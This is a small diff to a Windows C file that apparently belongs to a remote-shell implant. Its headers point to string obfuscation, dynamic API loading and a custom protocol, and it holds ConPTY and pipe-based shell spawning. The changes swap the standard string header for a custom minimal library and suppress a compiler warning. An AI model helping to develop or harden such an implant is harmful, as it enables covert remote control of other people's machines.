@@ -1,13 +1,13 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <stdint.h>
-#include <string.h>
 #include "shell.h"
 #include "protocol.h"
 #include "crypto.h"
 #include "dynapi.h"
 #include "obf.h"
 #include "obf_strings.h"
+#include "mini_std.h"
 
 #ifndef PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
 #define PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE 0x00020016
@@ -386,6 +386,8 @@ static DWORD WINAPI shell_input_thread(LPVOID param)
     return 0;
 }
 
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wcast-function-type"
 /* ------------------------------------------------------------------ */
 /*  try_conpty -- attempt ConPTY-based shell spawn                     */
 /* ------------------------------------------------------------------ */
@@ -523,6 +525,7 @@ static int try_conpty(void)
     InterlockedExchange(&g_shell_mode, SHELL_CONPTY);
     return 0;
 }
+#pragma GCC diagnostic pop
 
 /* ------------------------------------------------------------------ */
 /*  try_pipes -- fallback: plain pipe-based shell for older Windows     */
